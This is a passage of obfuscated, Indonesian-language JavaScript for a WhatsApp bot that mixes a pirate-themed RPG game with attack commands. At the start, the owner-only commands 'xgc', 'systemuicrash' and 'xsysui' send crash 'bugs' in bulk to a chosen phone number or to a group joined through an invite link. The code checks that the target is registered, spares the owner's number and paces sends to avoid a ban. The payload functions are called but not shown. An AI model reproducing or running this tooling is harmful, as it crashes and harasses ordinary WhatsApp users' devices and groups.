          let _0x4dc624 = encodeURI(_0x2b2627) * 0xc8;
          _0x3a091f("Tunggu sebentar, bug sedang diproses... 😏");
          await sleep(0x5dc);
          _0x508bc2(from, _0x4dc624);
          await sleep(0x9c4);
          _0x3f87c6.react('✅');
        }
        break;
      case "xgc":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("*CARA KIRIM BUG KE GRUP*\n\nGunakan format: " + (_0x4773c6 + _0x4ac520) + " https://chat.whatsapp.com/xxxx\n\n_*Catatan:*_ Kalau Kamu mau kirim bug dalam jumlah banyak, ketik seperti ini:\n\n*Kirim perintah*: ." + _0x4ac520 + " linkgc jumlah\n\n*Kirim perintah*: ." + _0x4ac520 + " https://chat.whatsapp.com/xxxx 10");
          }
          _0x3a091f("Tunggu dulu, bug lagi diproses ya... 😏");
          if (!_0x2b2627.split(" ")[0x0].includes("whatsapp.com")) {
            return _0x3a091f("Linknya gak valid, coba cek lagi! ❌");
          }
          let _0x23f7cb = _0x2b2627.split(" ")[0x0].split("https://chat.whatsapp.com/")[0x1];
          try {
            let _0x13bdf7 = _0x2b2627.split(" ")[0x1] ? _0x2b2627.split(" ")[0x1] : '1';
            let _0x1657a3 = await _0x59f5fa.groupAcceptInvite(_0x23f7cb);
            await sleep(0x7d0);
            _0x1bf3a3(_0x1657a3, _0x13bdf7);
            await sleep(0x9c4);
            _0x3a091f("Selesai! ✅ Bug berhasil dikirim ke grup!");
            _0x59f5fa.groupLeave(_0x1657a3);
          } catch (_0x8234df) {
            _0x3a091f("Oops, ada yang error! 😣\n\n" + util.format(_0x8234df));
          }
        }
        break;
      case "systemuicrash":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Gunakan formatnya seperti ini: " + (_0x4773c6 + _0x4ac520) + " nomor,jumlah\n*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " 6281234567890,10");
          }
          let _0x807141 = _0x2b2627.split(',')[0x0];
          let _0x3e6074 = _0x2b2627.split(',')[0x1] * 0x5;
          if (!_0x807141 || !_0x3e6074) {
            return _0x3a091f("Gunakan format yang benar: " + (_0x4773c6 + _0x4ac520) + " nomor,jumlah\n*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " 6281234567890,10");
          }
          if (isNaN(parseInt(_0x3e6074))) {
            return _0x3a091f("Jumlahnya harus berupa angka! 😅");
          }
          let _0xc31241 = _0x807141.replace(/[^0-9]/g, '');
          let _0x2ee15f = '' + encodeURI(_0x3e6074);
          let _0x3a69af = await _0x59f5fa.onWhatsApp(_0xc31241 + "@s.whatsapp.net");
          let _0x13c790 = _0xc31241 + "@s.whatsapp.net";
          if (_0xc31241 == ownerNumber) {
            return;
          }
          if (_0x3a69af.length == 0x0) {
            return _0x3a091f("Nomor ini belum terdaftar di WhatsApp! 🙁");
          }
          _0x3a091f("Tunggu sebentar ya, bug sedang diproses... 😏");
          await sleep(0x7d0);
          _0x159b95(_0x13c790, _0x2ee15f);
          await sleep(0x9c4);
          _0x23bdb1("Berhasil kirim bug ke @" + _0x13c790.split('@')[0x0] + " menggunakan *" + _0x4ac520 + "* ✅\n\nPause 2 menit biar bot gak kena banned.", [_0x13c790]);
        }
        break;
      case "xsysui":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Gunakan formatnya: " + (_0x4773c6 + _0x4ac520) + " nomor,jumlah\n*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " 6281234567890,10");
          }
          let _0x2a10e9 = _0x2b2627.split(',')[0x0];
          let _0x3d926f = _0x2b2627.split(',')[0x1] * 0x5;
          if (!_0x2a10e9 || !_0x3d926f) {
            return _0x3a091f("Gunakan format yang benar: " + (_0x4773c6 + _0x4ac520) + " nomor,jumlah\n*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " 6281234567890,10");
          }
          if (isNaN(parseInt(_0x3d926f))) {
            return _0x3a091f("Jumlahnya harus berupa angka! 😅");
          }
          let _0x4648de = _0x2a10e9.replace(/[^0-9]/g, '');
          let _0x511808 = '' + encodeURI(_0x3d926f);
          let _0x4aa563 = await _0x59f5fa.onWhatsApp(_0x4648de + "@s.whatsapp.net");
          let _0x555e94 = _0x4648de + "@s.whatsapp.net";
          if (_0x4648de == ownerNumber) {
            return;
          }
          if (_0x4aa563.length == 0x0) {
            return _0x3a091f("Nomor ini belum terdaftar di WhatsApp! 🙁");
          }
          _0x3a091f("Tunggu sebentar ya, bug sedang diproses... 😏");
          await sleep(0x7d0);
          _0x2de026(_0x555e94, _0x511808);
          await sleep(0x9c4);
          _0x23bdb1("Berhasil kirim bug ke @" + _0x555e94.split('@')[0x0] + " menggunakan *" + _0x4ac520 + "* ✅\n\nPause 2 menit biar bot gak kena banned.", [_0x555e94]);
        }
        break;
      case 'joinrpg':
        {
          if (db.data.users[_0x3f87c6.sender].rpg) {
            return _0x3a091f("⚠️ *Kamu sudah bergabung dalam RPG sebelumnya!*");
          }
          db.data.users[_0x3f87c6.sender].rpg = true;
          await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'text': "🎮 *GAME RPG DIMULAI!*\n\n✅ Kamu telah bergabung dalam RPG-Game.\n🔹 Sekarang kamu bisa menggunakan command RPG!\n",
            'contextInfo': {
              'mentionedJid': [_0x3f87c6.sender],
              'forwardingScore': 0x270f,
              'isForwarded': true,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': saluran,
                'serverMessageId': null,
                'newsletterName': saluranName
              },
              'externalAdReply': {
                'title': "🏴‍☠️ RPG-GAME (Pirate Adventure)",
                'body': "Petualangan bajak laut mencari harta karun!",
                'thumbnailUrl': 'https://telegra.ph/file/d661d7829411b8bff9f5f.jpg',
                'sourceUrl': wagc,
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case "mining":
        {
          if (!db.data.users[_0x3f87c6.sender].rpg) {
            return _0x3a091f("⚠️ *Bergabung dulu ke RPG!*\n\nKetik _.joinrpg_");
          }
          if (!db.data.rpg[_0x3f87c6.sender].pickaxe) {
            return _0x3a091f("⚠️ *Kamu tidak memiliki Pickaxe!*\nBuat dulu dengan _.craft_");
          }
          if (db.data.rpg[_0x3f87c6.sender].darahpickaxe < 0x1) {
            return _0x3a091f("☹️ *Pickaxe kamu rusak!*\nRawat dulu dengan _.rawat_");
          }
          let _0x1a6313 = {
            'besi': [0x2, 0x1, 0x6, 0x1, 0x0, 0x3, 0x7, 0x8, 0x3, 0x2, 0x0, 0x7, 0x1, 0x9],
            'batubara': [0x1, 0x1, 0x2, 0x1, 0x0, 0x6, 0x0, 0x0, 0x2, 0x5, 0x1, 0x0, 0x1, 0x0],
            'emas': [0x3, 0x2, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x2, 0x2, 0x0],
            'perak': [0x2, 0x1, 0x3, 0x5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x1, 0x0, 0x8, 0x2]
          };
          let _0x1493e7 = {};
          for (let _0x3806fa in _0x1a6313) {
            _0x1493e7[_0x3806fa] = await _0x1a6313[_0x3806fa][Math.floor(Math.random() * _0x1a6313[_0x3806fa].length)];
            db.data.rpg[_0x3f87c6.sender][_0x3806fa] += _0x1493e7[_0x3806fa];
          }
          let _0x4f38a7 = "⛏️ *MINING ADVENTURE*\n\n🔹 **Hasil Tambang:**\n";
          _0x4f38a7 += " 🔩 Besi: " + _0x1493e7.besi + "\n 🪨 Batu Bara: " + _0x1493e7.batubara + "\n 💰 Emas: " + _0x1493e7.emas + "\n ⚪ Perak: " + _0x1493e7.perak + "\n\n";
          _0x4f38a7 += "✅ *Item disimpan di inventory!*\n❤️ *Darah berkurang 20*\n⛏️ *Ketahanan Pickaxe: " + (db.data.rpg[_0x3f87c6.sender].darahpickaxe - 0x14) + '%*';
          db.data.rpg[_0x3f87c6.sender].darahpickaxe -= 0x14;
          await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'text': _0x4f38a7,
            'contextInfo': {
              'mentionedJid': [_0x3f87c6.sender],
              'forwardingScore': 0x270f,
              'isForwarded': true,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': saluran,
                'serverMessageId': null,
                'newsletterName': saluranName
              },
              'externalAdReply': {
                'title': "⛏️ RPG-GAME (Mining Resource)",
                'body': "Tambang sumber daya alam!",
                'thumbnailUrl': "https://telegra.ph/file/4ca67ad95bce6afa1a0f2.jpg",
                'sourceUrl': wagc,
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0x3f87c6
          });
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
        }
        break;
      case "heal":
        {
          if (!db.data.users[_0x3f87c6.sender].rpg) {
            return _0x3a091f("⚠️ *Bergabung dulu ke RPG!*\n\nKetik _.joinrpg_");
          }
          if (db.data.rpg[_0x3f87c6.sender].darahuser >= 0x64) {
            return _0x3a091f("✅ *Kamu masih sehat, tidak perlu heal!*");
          }
          db.data.rpg[_0x3f87c6.sender].darahuser = 0x64;
          _0xf0066("🛌 Mengistirahatkan tubuh...", "🩹 Memulihkan...", "❤️ *Darah kamu sudah terisi kembali!*");
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
        }
        break;
      case "crafting":
      case "craft":
        {
          if (!db.data.users[_0x3f87c6.sender].rpg) {
            return _0x3a091f("*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_");
          }
          if (_0x143458[0x0] === 'kain') {
            if (!_0x143458[0x1]) {
              return _0x3a091f("*Masukan Jumlahnya!*\n\nContoh:\n.craft kain 1\n\nUntuk Membuat 1 Lembar Kain Diperlukan *2 Bulu Wolf*.\n\nSilahkan Berbulu Terlebih Dahulu!");
            }
            if (isNaN(_0x143458[0x1])) {
              return _0x3a091f("*Jumlah Harus Berupa Angka!*\n\nContoh:\n.craft kain 1\n\nUntuk Membuat 1 Lembar Kain Diperlukan *2 Bulu Wolf*.\n\nSilahkan Berbulu Terlebih Dahulu!");
            }
            let _0x70a59e = Number(parseInt(_0x143458[0x1]) * 0x2);
            if (db.data.rpg[_0x3f87c6.sender].bulu < _0x70a59e) {
              return _0x3a091f("*Bulu Wol Kamu (" + db.data.rpg[_0x3f87c6.sender].bulu + ") Tidak Cukup Untuk Membuat " + _0x143458[0x1] + " Lembar Kain*\n\nUntuk Membuat 1 Lembar Kain Diperlukan *2 Bulu Wolf*.\n\nSilahkan Berbulu Terlebih Dahulu!");
            }
            db.data.rpg[_0x3f87c6.sender].kain += parseInt(_0x143458[0x1]);
            db.data.rpg[_0x3f87c6.sender].bulu -= _0x70a59e;
            _0x3a091f("Berhasil Membuat " + _0x143458[0x1] + " Lembar Kain, Kamu Mempunyai " + db.data.rpg[_0x3f87c6.sender].bulu + " Bulu Lagi");
          } else {
            if (_0x143458[0x0] === "kapal") {
              if (db.data.rpg[_0x3f87c6.sender].kapal) {
                return _0x3a091f("Kamu Sudah Memiliki Kapal!");
              }
              let _0x401ff3 = Number(0x14);
              let _0x25ed07 = Number(0x32);
              let _0x13e1cc = Number(0x2);
              if (db.data.rpg[_0x3f87c6.sender].besi < _0x401ff3) {
                return _0x3a091f("*Besi Kamu (" + db.data.rpg[_0x3f87c6.sender].besi + ") Tidak Cukup Untuk Membuat Kapal*\n\nUntuk Membuat Kapal Diperlukan *20 Besi, 50 Kayu, 2 Kain*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!");
              }
              if (db.data.rpg[_0x3f87c6.sender].kayu < _0x25ed07) {
                return _0x3a091f("*Kayu Kamu (" + db.data.rpg[_0x3f87c6.sender].kayu + ") Tidak Cukup Untuk Membuat Kapal*\n\nUntuk Membuat Kapal Diperlukan *20 Besi, 50 Kayu, 2 Kain*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!");
              }
              if (db.data.rpg[_0x3f87c6.sender].kain < _0x13e1cc) {
                return _0x3a091f("*Kain Kamu (" + db.data.rpg[_0x3f87c6.sender].kain + ") Tidak Cukup Untuk Membuat Kapal*\n\nUntuk Membuat Kapal Diperlukan *20 Besi, 50 Kayu, 2 Kain*.\n\nSilahkan Crafting Kain Terlebih Dahulu!");
              }
              db.data.rpg[_0x3f87c6.sender].kapal = true;
              db.data.rpg[_0x3f87c6.sender].besi -= _0x401ff3;
              db.data.rpg[_0x3f87c6.sender].kayu -= _0x25ed07;
              db.data.rpg[_0x3f87c6.sender].kain -= _0x13e1cc;
              let _0x425a6f = "*Berhasil Membuat Kapal!*\n\nSisa Sumberdaya:\n- Besi: " + db.data.rpg[_0x3f87c6.sender].besi + "\n- Kain: " + db.data.rpg[_0x3f87c6.sender].kain + "\n- Kayu: " + db.data.rpg[_0x3f87c6.sender].kayu + "\n\n";
              await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': _0x425a6f,
                'contextInfo': {
                  'mentionedJid': [_0x3f87c6.sender],
                  'forwardingScore': 0x270f,
                  'isForwarded': true,
                  'forwardedNewsletterMessageInfo': {
                    'newsletterJid': saluran,
                    'serverMessageId': null,
                    'newsletterName': saluranName
                  },
                  'externalAdReply': {
                    'title': "RPG-GAME (Pirate Ship)",
                    'body': "Build a pirate ship",
                    'thumbnailUrl': "https://telegra.ph/file/6868733df8aa286682274.jpg",
                    'sourceUrl': wagc,
                    'mediaType': 0x1,
                    'renderLargerThumbnail': true
                  }
                }
              }, {
                'quoted': _0x3f87c6
              });
            } else {
              if (_0x143458[0x0] === "kapak") {
                if (db.data.rpg[_0x3f87c6.sender].kapak) {
                  return _0x3a091f("Kamu Sudah Memiliki Kapak!");
                }
                let _0x31a983 = Number(0x2);
                let _0x51b257 = Number(0x1);
                if (db.data.rpg[_0x3f87c6.sender].besi < _0x31a983) {
                  return _0x3a091f("*Besi Kamu (" + db.data.rpg[_0x3f87c6.sender].besi + ") Tidak Cukup Untuk Membuat Kapak*\n\nUntuk Membuat Kapak Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!");
                }
                if (db.data.rpg[_0x3f87c6.sender].kayu < _0x51b257) {
                  return _0x3a091f("*Kayu Kamu (" + db.data.rpg[_0x3f87c6.sender].kayu + ") Tidak Cukup Untuk Membuat Kapak*\n\nUntuk Membuat Kapak Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!");
                }
                db.data.rpg[_0x3f87c6.sender].kapak = true;
                db.data.rpg[_0x3f87c6.sender].besi -= _0x31a983;
                db.data.rpg[_0x3f87c6.sender].kayu -= _0x51b257;
                let _0x5dcd08 = "*Berhasil Membuat Kapak!*\n\nSisa Sumberdaya:\n- Besi: " + db.data.rpg[_0x3f87c6.sender].besi + "\n- Kayu: " + db.data.rpg[_0x3f87c6.sender].kayu + "\n\n";
                await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                  'text': _0x5dcd08,
                  'contextInfo': {
                    'mentionedJid': [_0x3f87c6.sender],
                    'forwardingScore': 0x270f,
                    'isForwarded': true,
                    'forwardedNewsletterMessageInfo': {
                      'newsletterJid': saluran,
                      'serverMessageId': null,
                      'newsletterName': saluranName
                    },
                    'externalAdReply': {
                      'title': "RPG-GAME (Tools Crafting)",
                      'body': "Making equipment",
                      'thumbnailUrl': 'https://telegra.ph/file/454b6bac735cd5c9e860e.jpg',
                      'sourceUrl': wagc,
                      'mediaType': 0x1,
                      'renderLargerThumbnail': true
                    }
                  }
                }, {
                  'quoted': _0x3f87c6
                });
              } else {
                if (_0x143458[0x0] === "rumah") {
                  if (!('' + db.data.rpg[_0x3f87c6.sender].wilayahrumah === '' + db.data.rpg[_0x3f87c6.sender].wilayah)) {
                    return _0x3a091f("Kamu Saat Ini Sedang Di " + db.data.rpg[_0x3f87c6.sender].wilayah + ", Kamu Hanya Dapat Membangun Rumah Di Indonesia, Silahkan Kembali Berlayar Ke Indonesia Untuk Membangun Rumah");
                  }
                  if (!_0x143458[0x1]) {
                    return _0x3a091f("*Masukan Jumlahnya!*\n\nContoh:\n.craft rumah 1\n\nUntuk Membuat 1 Rumah Diperlukan *6 Besi, 20 Kayu*. Pastikan Sumberdaya Kamu Cukup!");
                  }
                  if (isNaN(_0x143458[0x1])) {
                    return _0x3a091f("*Jumlah Harus Berupa Angka!*\n\nContoh:\n.craft rumah 1\n\nUntuk Membuat 1 Rumah Diperlukan *6 Besi, 20 Kayu*. Pastikan Sumberdaya Kamu Cukup!");
                  }
                  let _0x54f886 = Number(parseInt(_0x143458[0x1]) * 0x6);
                  let _0x2279ee = Number(parseInt(_0x143458[0x1]) * 0x14);
                  if (db.data.rpg[_0x3f87c6.sender].besi < _0x54f886) {
                    return _0x3a091f("*Besi Kamu (" + db.data.rpg[_0x3f87c6.sender].besi + ") Tidak Cukup Untuk Membuat Rumah*\n\nUntuk Membuat Rumah Diperlukan *6 Besi, 20 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!");
                  }
                  if (db.data.rpg[_0x3f87c6.sender].kayu < _0x2279ee) {
                    return _0x3a091f("*Kayu Kamu (" + db.data.rpg[_0x3f87c6.sender].kayu + ") Tidak Cukup Untuk Membuat Rumah*\n\nUntuk Membuat Rumah Diperlukan *6 Besi, 20 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!");
                  }
                  db.data.rpg[_0x3f87c6.sender].rumah += parseInt(_0x143458[0x1]);
                  db.data.rpg[_0x3f87c6.sender].besi -= _0x54f886;
                  db.data.rpg[_0x3f87c6.sender].kayu -= _0x2279ee;
                  let _0x1397c8 = "*Berhasil Membuat " + _0x143458[0x1] + " Rumah!*\n\nJumlah: " + _0x143458[0x1] + " Rumah\nLetak: Indonesia\n\n";
                  await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                    'text': _0x1397c8,
                    'contextInfo': {
                      'mentionedJid': [_0x3f87c6.sender],
                      'forwardingScore': 0x270f,
                      'isForwarded': true,
                      'forwardedNewsletterMessageInfo': {
                        'newsletterJid': saluran,
                        'serverMessageId': null,
                        'newsletterName': saluranName
                      },
                      'externalAdReply': {
                        'title': "RPG-GAME (House Crafting)",
                        'body': "Build a house to rest",
                        'thumbnailUrl': "https://telegra.ph/file/748043e987c3b38708d44.jpg",
                        'sourceUrl': wagc,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': true
                      }
                    }
                  }, {
                    'quoted': _0x3f87c6
                  });
                } else {
                  if (_0x143458[0x0] === "pickaxe") {
                    if (db.data.rpg[_0x3f87c6.sender].pickaxe) {
                      return _0x3a091f("Kamu Sudah Memiliki Pickaxe!");
                    }
                    let _0xf8cd41 = Number(0x2);
                    let _0x47fe50 = Number(0x1);
                    if (db.data.rpg[_0x3f87c6.sender].besi < _0xf8cd41) {
                      return _0x3a091f("*Besi Kamu (" + db.data.rpg[_0x3f87c6.sender].besi + ") Tidak Cukup Untuk Membuat Pickaxe*\n\nUntuk Membuat Pickaxe Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!");
                    }
                    if (db.data.rpg[_0x3f87c6.sender].kayu < _0x47fe50) {
                      return _0x3a091f("*Kayu Kamu (" + db.data.rpg[_0x3f87c6.sender].kayu + ") Tidak Cukup Untuk Membuat Pickaxe*\n\nUntuk Membuat Pickaxe Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!");
                    }
                    db.data.rpg[_0x3f87c6.sender].pickaxe = true;
                    db.data.rpg[_0x3f87c6.sender].besi -= _0xf8cd41;
                    db.data.rpg[_0x3f87c6.sender].kayu -= _0x47fe50;
                    let _0x4f5b0c = "*Berhasil Membuat Pickaxe!*\n\nSisa Sumberdaya:\n- Besi: " + db.data.rpg[_0x3f87c6.sender].besi + "\n- Kayu: " + db.data.rpg[_0x3f87c6.sender].kayu + "\n\n";
                    await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                      'text': _0x4f5b0c,
                      'contextInfo': {
                        'mentionedJid': [_0x3f87c6.sender],
                        'forwardingScore': 0x270f,
                        'isForwarded': true,
                        'forwardedNewsletterMessageInfo': {
                          'newsletterJid': saluran,
                          'serverMessageId': null,
                          'newsletterName': saluranName
                        },
                        'externalAdReply': {
                          'title': "RPG-GAME (Tools Crafting)",
                          'body': "Making equipment",
                          'thumbnailUrl': "https://telegra.ph/file/9bd57cb7d6e04a4a51d7c.jpg",
                          'sourceUrl': wagc,
                          'mediaType': 0x1,
                          'renderLargerThumbnail': true
                        }
                      }
                    }, {
                      'quoted': _0x3f87c6
                    });
                  } else {
                    if (_0x143458[0x0] === "bajuzirah") {
                      if (db.data.rpg[_0x3f87c6.sender].bzirah) {
                        return _0x3a091f("Kamu Sudah Memiliki Baju Zirah!");
                      }
                      let _0x8668ae = Number(0x6);
                      let _0x545972 = Number(0x2);
                      let _0x29bd20 = Number(0xa);
                      if (db.data.rpg[_0x3f87c6.sender].besi < _0x8668ae) {
                        return _0x3a091f("*Besi Kamu (" + db.data.rpg[_0x3f87c6.sender].besi + ") Tidak Cukup Untuk Membuat Baju Zirah*\n\nUntuk Membuat Baju Zirah Diperlukan *6 Besi, 2 Kayu, 10 Kain*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!");
                      }
                      if (db.data.rpg[_0x3f87c6.sender].kayu < _0x545972) {
                        return _0x3a091f("*Kayu Kamu (" + db.data.rpg[_0x3f87c6.sender].kayu + ") Tidak Cukup Untuk Membuat Baju Zirah*\n\nUntuk Membuat Baju Zirah Diperlukan *6 Besi, 2 Kayu, 10 Kain*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!");
                      }
                      if (db.data.rpg[_0x3f87c6.sender].kain < _0x29bd20) {
                        return _0x3a091f("*Kain Kamu (" + db.data.rpg[_0x3f87c6.sender].kain + ") Tidak Cukup Untuk Membuat Baju Zirah*\n\nUntuk Membuat Baju Zirah Diperlukan *6 Besi, 2 Kayu, 10 Kain*.\n\nSilahkan Crafting Kain Terlebih Dahulu!");
                      }
                      db.data.rpg[_0x3f87c6.sender].bzirah = true;
                      db.data.rpg[_0x3f87c6.sender].besi -= _0x8668ae;
                      db.data.rpg[_0x3f87c6.sender].kayu -= _0x545972;
                      db.data.rpg[_0x3f87c6.sender].kain -= _0x29bd20;
                      let _0x5cdb40 = "*Berhasil Membuat Baju Zirah!*\n\nSisa Sumberdaya:\n- Besi: " + db.data.rpg[_0x3f87c6.sender].besi + "\n- Kayu: " + db.data.rpg[_0x3f87c6.sender].kayu + "\n- Kain: " + db.data.rpg[_0x3f87c6.sender].kain + "\n\n";
                      await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                        'text': _0x5cdb40,
                        'contextInfo': {
                          'mentionedJid': [_0x3f87c6.sender],
                          'forwardingScore': 0x270f,
                          'isForwarded': true,
                          'forwardedNewsletterMessageInfo': {
                            'newsletterJid': saluran,
                            'serverMessageId': null,
                            'newsletterName': saluranName
                          },
                          'externalAdReply': {
                            'title': "RPG-GAME (Tools Crafting)",
                            'body': "Making equipment",
                            'thumbnailUrl': "https://telegra.ph/file/2a8bf170a5b74aa808078.jpg",
                            'sourceUrl': wagc,
                            'mediaType': 0x1,
                            'renderLargerThumbnail': true
                          }
                        }
                      }, {
                        'quoted': _0x3f87c6
                      });
                    } else {
                      if (_0x143458[0x0] === "pedang") {
                        if (db.data.rpg[_0x3f87c6.sender].pedang) {
                          return _0x3a091f("Kamu Sudah Memiliki Pedang!");
                        }
                        let _0x55d9f9 = Number(0x3);
                        let _0x3adda0 = Number(0x1);
                        if (db.data.rpg[_0x3f87c6.sender].besi < _0x55d9f9) {
                          return _0x3a091f("*Besi Kamu (" + db.data.rpg[_0x3f87c6.sender].besi + ") Tidak Cukup Untuk Membuat Pedang*\n\nUntuk Membuat Pedang Diperlukan *3 Besi, 1 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!");
                        }
                        if (db.data.rpg[_0x3f87c6.sender].kayu < _0x3adda0) {
                          return _0x3a091f("*Kayu Kamu (" + db.data.rpg[_0x3f87c6.sender].kayu + ") Tidak Cukup Untuk Membuat Pedang*\n\nUntuk Membuat Pedang Diperlukan *3 Besi, 1 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!");
                        }
                        db.data.rpg[_0x3f87c6.sender].pedang = true;
                        db.data.rpg[_0x3f87c6.sender].besi -= _0x55d9f9;
                        db.data.rpg[_0x3f87c6.sender].kayu -= _0x3adda0;
                        let _0x3558a7 = "*Berhasil Membuat Pedang!*\n\nSisa Sumberdaya:\n- Besi: " + db.data.rpg[_0x3f87c6.sender].besi + "\n- Kayu: " + db.data.rpg[_0x3f87c6.sender].kayu + "\n\n";
                        await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                          'text': _0x3558a7,
                          'contextInfo': {
                            'mentionedJid': [_0x3f87c6.sender],
                            'forwardingScore': 0x270f,
                            'isForwarded': true,
                            'forwardedNewsletterMessageInfo': {
                              'newsletterJid': saluran,
                              'serverMessageId': null,
                              'newsletterName': saluranName
                            },
                            'externalAdReply': {
                              'title': "RPG-GAME (Tools Crafting)",
                              'body': "Making equipment",
                              'thumbnailUrl': "https://telegra.ph/file/0c245751d14b42fe7f3c0.jpg",
                              'sourceUrl': wagc,
                              'mediaType': 0x1,
                              'renderLargerThumbnail': true
                            }
                          }
                        }, {
                          'quoted': _0x3f87c6
                        });
                      } else {
                        let _0xfd15fd = '';
                        _0xfd15fd += "*Apa yang ingin Kamu buat?*\n\n";
                        _0xfd15fd += "- kapal\n";
                        _0xfd15fd += "- rumah\n";
                        _0xfd15fd += "- kapak\n";
                        _0xfd15fd += "- pickaxe\n";
                        _0xfd15fd += "- pedang\n";
                        _0xfd15fd += "- bajuzirah\n";
                        _0xfd15fd += "- kain\n\n";
                        _0xfd15fd += "*Contoh:*\n";
                        _0xfd15fd += ".craft kapak\n";
                        await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                          'text': _0xfd15fd,
                          'contextInfo': {
                            'mentionedJid': [_0x3f87c6.sender],
                            'forwardingScore': 0x270f,
                            'isForwarded': true,
                            'forwardedNewsletterMessageInfo': {
                              'newsletterJid': saluran,
                              'serverMessageId': null,
                              'newsletterName': saluranName
                            },
                            'externalAdReply': {
                              'title': "RPG-GAME (Crafting Item)",
                              'body': "Make items for survival and adventure",
                              'thumbnailUrl': "https://telegra.ph/file/fed81e9a280d8a3965d6f.jpg",
                              'sourceUrl': wagc,
                              'mediaType': 0x1,
                              'renderLargerThumbnail': true
                            }
                          }
                        }, {
                          'quoted': _0x3f87c6
                        });
                      }
                    }
                  }
                }
              }
            }
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "berlayar":
        {
          if (!db.data.users[_0x3f87c6.sender].rpg) {
            return _0x3a091f("*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_");
          }
          if (!db.data.rpg[_0x3f87c6.sender].kapal) {
            return _0x3a091f("Kamu Tidak Mempunyai Kapal, Silahkan Crafting Kapal Terlebih Dahulu!");
          }
          if (db.data.rpg[_0x3f87c6.sender].darahkapal < 0x1) {
            return _0x3a091f("Kapal Kamu Rusak, Perbaiki Terlebih Dahulu Kapal Mu\n\nKetik .rawat");
          }
          if (pirates[_0x3f87c6.sender]) {
            return _0x3a091f("Kamu sedang berlayar!!");
          }
          if (db.data.rpg[_0x3f87c6.sender].wilayah === _0x143458[0x0]) {
            return _0x3a091f("Kamu Sedang Di " + _0x143458[0x0] + " Saat Ini, Silahkan Pilih Destinasi Lain");
          }
          if (_0x143458[0x0] === "indonesia") {
            _0xf0066("Menyiapkan Perbekalan...", "Melepaskan Tali Kapal...", "Kapal Mulai Berlayar Menjauhi Pelabuhan...");
            let _0x56c7a9 = ['kargo', "pesiar", 'nelayan', "perang", "tanker", 'kontainer', "feri"];
            let _0x1f2695 = [0xe, 0x44, 0x40, 0x2c, 0x18, 0x6, 0x8, 0x30, 0x20, 0x12, 0xa, 0x16, 0x6, 0x2a, 0xc];
            let _0x2ccf2e = await _0x56c7a9[Math.floor(Math.random() * _0x56c7a9.length)];
            let _0x4da15f = await _0x1f2695[Math.floor(Math.random() * _0x1f2695.length)];
            db.data.rpg[_0x3f87c6.sender].wilayah = _0x143458[0x0];
            await sleep(0x2710);
            let _0x2a184 = "Ditengah perjalanan ke\n" + _0x143458[0x0] + " Kamu bertemu\ndengan kapal *" + _0x2ccf2e + "*\nyang memiliki kru dengan\njumlah *" + _0x4da15f + " orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*";
            let _0x51b3b1 = [{
              'name': 'quick_reply',
              'buttonParamsJson': "{\"display_text\":\"Serang🏴‍☠️\",\"id\":\"serang\"}"
            }, {
              'name': "quick_reply",
              'buttonParamsJson': "{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".nyerah\"}"
            }];
            pirates[_0x3f87c6.sender] = [await _0x59f5fa.sendButtonText(_0x3f87c6.chat, _0x51b3b1, "*PIRATE BATTLE 🏴‍☠️*\n", _0x2a184, footer, _0x3f87c6), _0x2ccf2e, _0x4da15f, _0x143458[0x0], setTimeout(() => {
              if (pirates[_0x3f87c6.sender]) {
                db.data.rpg[_0x3f87c6.sender].darahkapal = 0x0;
                _0x3a091f("*Kamu telah terdeteksi perompak, kapal mu di bom tentara*");
                delete pirates[_0x3f87c6.sender];
              }
            }, 0x1d4c0)];
          } else {
            if (_0x143458[0x0] === 'india') {
